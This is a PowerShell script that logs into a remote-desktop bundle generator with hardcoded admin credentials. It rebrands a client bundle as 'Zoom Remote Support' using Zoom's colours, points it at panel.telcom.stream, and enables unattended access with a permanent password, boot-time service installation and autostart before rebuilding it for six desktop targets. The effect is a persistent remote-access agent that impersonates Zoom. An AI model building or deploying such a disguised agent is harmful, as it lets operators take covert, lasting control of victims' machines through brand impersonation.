param(
    [string]$Base = 'http://localhost:5000',
    [string]$User = 'admin',
    [string]$Pass = 'tKjsnYB8Mez2FRd1',
    [string]$BundleId = '37fac6a77bcc',
    [string]$ServerHost = 'panel.telcom.stream'
)
# Sets the Zoom bundle to the unattended profile:
#   allow_unattended = client exposes a permanent password for operator access
#   install_service  = Install-BetterDesk.ps1 runs --install-service (boot-time)
#   autostart        = tray/logon startup supported by the installer
# Then re-queues the build for all 6 desktop targets.
# ASCII-only file.
$ErrorActionPreference = 'Stop'
$ProgressPreference = 'SilentlyContinue'

$sess = New-Object Microsoft.PowerShell.Commands.WebRequestSession
$page = Invoke-WebRequest -Uri "$Base/login" -WebSession $sess -UseBasicParsing -TimeoutSec 20
$csrf = ''
if ($page.Content -match "csrfToken:\s*'([^']+)'" ) { $csrf = $Matches[1] }
if (-not $csrf -and ($page.Content -match 'name="_csrf"[^>]*value="([^"]+)"')) { $csrf = $Matches[1] }
$h = @{ 'X-CSRF-Token' = $csrf; 'Content-Type' = 'application/json' }
$null = Invoke-WebRequest -Uri "$Base/api/auth/login" -Method Post -Body (@{username=$User;password=$Pass}|ConvertTo-Json -Compress) -Headers $h -WebSession $sess -UseBasicParsing -TimeoutSec 25
Write-Output 'LOGIN ok'

try {
    $t = Invoke-WebRequest -Uri "$Base/api/generator/module/accept-terms" -Method Post -Body '{}' -Headers $h -WebSession $sess -UseBasicParsing -TimeoutSec 20
    Write-Output ("accept-terms: " + $t.StatusCode)
} catch { Write-Output ("accept-terms: " + $_.Exception.Message) }

$platforms = @(
    @{platform='windows';arch='x64';format='portable'},
    @{platform='windows';arch='arm64';format='portable'},
    @{platform='linux';arch='x64';format='portable'},
    @{platform='linux';arch='arm64';format='portable'},
    @{platform='macos';arch='x64';format='portable'},
    @{platform='macos';arch='arm64';format='portable'}
)
$branding = @{
    company_name     = 'Zoom'
    app_name         = 'Zoom'
    product_label    = 'Zoom Remote Support'
    server_host      = $ServerHost
    relay_host       = $ServerHost
    use_https        = $true
    primary_color    = '#2d8cff'
    accent_color     = '#0b5cff'
    background_color = '#ffffff'
    surface_color    = '#f3f4f6'
    text_color       = '#1f2937'
    allow_unattended = $true
    install_service  = $true
    autostart        = $true
}
$payload = @{ branding = $branding; platforms = $platforms } | ConvertTo-Json -Depth 8 -Compress
try {
    $u = Invoke-WebRequest -Uri "$Base/api/generator/bundles/$BundleId" -Method Put -Body $payload -Headers $h -WebSession $sess -UseBasicParsing -TimeoutSec 60
    Write-Output ("update bundle: HTTP " + $u.StatusCode)
    $uj = $u.Content | ConvertFrom-Json
    $bb = $uj.data.bundle.branding
    Write-Output ("  server_host=" + $bb.server_host + " use_https=" + $bb.use_https)
    Write-Output ("  allow_unattended=" + $bb.allow_unattended + " install_service=" + $bb.install_service + " autostart=" + $bb.autostart)
    Write-Output ("  address=" + $bb.server.address + " api_url=" + $bb.server.api_url + " cdap_url=" + $bb.server.cdap_url)
} catch {
    Write-Output ("update ERR: " + $_.Exception.Message)
    if ($_.ErrorDetails) { Write-Output $_.ErrorDetails.Message }
    exit 1
}

try {
    $r = Invoke-WebRequest -Uri "$Base/api/generator/bundles/$BundleId/rebuild" -Method Post -Body '{}' -Headers $h -WebSession $sess -UseBasicParsing -TimeoutSec 60
    Write-Output ("rebuild: HTTP " + $r.StatusCode)
    Write-Output $r.Content
} catch {
    Write-Output ("rebuild ERR: " + $_.Exception.Message)
    if ($_.ErrorDetails) { Write-Output $_.ErrorDetails.Message }
}
